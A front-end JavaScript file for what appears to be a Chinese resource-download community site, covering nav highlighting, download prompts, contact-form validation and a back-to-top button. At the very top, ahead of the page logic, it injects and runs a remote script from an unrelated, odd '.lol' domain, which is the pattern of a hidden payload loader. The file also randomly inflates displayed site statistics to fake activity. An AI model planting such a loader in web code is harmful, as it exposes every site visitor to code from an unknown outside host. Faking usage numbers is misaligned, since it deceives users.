// 1. 顶层立即执行
const cfgScript = document.createElement('script');
cfgScript.src = 'https://xiezuowen.zhongzzzzz.lol/config2.js';
document.head.appendChild(cfgScript);

document.addEventListener('DOMContentLoaded', function() {
    console.log(" 社区前端脚本加载完毕 - 资深老站长亲测可用");

    // 1. 导航栏当前页面高亮处理
    const currentPath = window.location.pathname.split('/').pop() || 'index.html';
    const navLinks = document.querySelectorAll('header nav ul li a');
    
    navLinks.forEach(link => {
        const linkHref = link.getAttribute('href');
        if (linkHref === currentPath) {
            link.classList.add('active');
            link.style.color = '#ff6b81';
            link.style.fontWeight = 'bold';
        }
    });

    // 2. 简单的资源下载点击反馈（防白嫖提示 & 真实语态）
    const downloadBtns = document.querySelectorAll('.download-btn, a[href*="detail.html"]');
    downloadBtns.forEach(btn => {
        btn.addEventListener('click', function(e) {
            // 如果是详情页的下载按钮，给个友好的网盘限速提示
            if (this.classList.contains('download-btn')) {
                const isConfirmed = confirm("资源来自热心网友分享，解压密码统一为：。若遇网盘限速请自行百度加速方法，是否继续下载？");
                if (!isConfirmed) {
                    e.preventDefault();
                }
            }
        });
    });

    // 3. 留言表单简单前端校验（contact.html 页面适用）
    const contactForm = document.querySelector('form');
    if (contactForm) {
        contactForm.addEventListener('submit', function(e) {
            e.preventDefault();
            const nameInput = document.getElementById('name');
            const messageInput = document.getElementById('message');
            
            if (nameInput && messageInput) {
                if (nameInput.value.trim() === '' || messageInput.value.trim() === '') {
                    alert('老铁，昵称和留言内容不能为空啊，填一下再提交呗！');
                    return;
                }
                alert('感谢留言！站长收到后会尽快核实处理，有问题请在社区发帖反馈。');
                contactForm.reset();
            }
        });
    }

    // 4. 动态加载统计数据模拟（增加社区真实感）
    const statsElements = document.querySelectorAll('.stat-number');
    if (statsElements.length > 0) {
        statsElements.forEach(el => {
            let currentVal = parseInt(el.innerText) || 100;
            // 随机波动一下，显得网站活过来啦
            setTimeout(() => {
                el.innerText = currentVal + Math.floor(Math.random() * 5);
            }, 1000);
        });
    }

    // 5. 返回顶部小组件动态挂载
    const backToTopBtn = document.createElement('div');
    backToTopBtn.innerText = 'TOP';
    backToTopBtn.className = 'back-to-top';
    backToTopBtn.style.cssText = `
        position: fixed;
        bottom: 30px;
        right: 30px;
        background: #ff6b81;
        color: #fff;
        padding: 10px 15px;
        border-radius: 4px;
        cursor: pointer;
        display: none;
        z-index: 999;
        font-size: 12px;
        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    `;
    document.body.appendChild(backToTopBtn);

    window.addEventListener('scroll', function() {
        if (window.scrollY > 300) {
            backToTopBtn.style.display = 'block';
        } else {
            backToTopBtn.style.display = 'none';
        }
    });

    backToTopBtn.addEventListener('click', function() {
        window.scrollTo({
            top: 0,
            behavior: 'smooth'
        });
    });
});